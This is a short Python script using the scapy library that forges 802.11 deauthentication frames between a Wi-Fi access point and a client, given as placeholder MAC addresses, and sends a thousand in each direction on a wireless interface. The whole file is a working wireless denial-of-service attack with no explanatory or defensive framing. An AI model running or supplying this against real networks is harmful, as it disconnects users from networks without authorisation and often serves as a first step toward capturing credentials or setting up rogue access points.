from scapy.all import *

#access point mac
ap = "00:00:00:00:00:00"

#client mac
client = "AA:AA:AA:AA:AA:AA"

pktAP = RadioTap()/Dot11(addr1=client, addr2= ap, addr3=ap)/Dot11Deauth(reason=3)

pktCnt = RadioTap()/Dot11(addr1=ap, addr2= client, addr3=client)/Dot11Deauth(reason=3)

sendp(pktAP, count = 1000, iface="wlan0")

sendp(pktCnt, count = 1000, iface="wlan0")
